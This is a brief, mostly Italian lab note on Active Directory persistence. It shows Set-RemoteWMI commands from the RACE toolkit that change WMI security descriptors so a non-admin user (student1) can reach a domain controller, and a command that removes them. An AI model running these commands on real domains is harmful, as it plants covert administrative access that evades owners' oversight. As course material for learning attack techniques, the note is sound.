# Persistence using ACLs - Security Descriptors - WMI

* Le ACLs possono essere modificate al fine di permettere ad un utente non-admin l'access ai securable objects
* Utilizzando RACE toolkit --> . C:\AD\Tools\RACE-master\RACE.ps1
* Sulla macchina locale per l'utente studentx

```powershell
Set-RemoteWMI -SamAccountName student1 -Verbose
```

* Su una macchina remota per lo studenx senza credenziali esplicite

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'
-Verbose
```

* On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential
Administrator -namespace 'root\cimv2' -Verbose
```

* Rimuove i permessi su una macchina remoto

```powershell
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2'
-Remove -Verbose
```
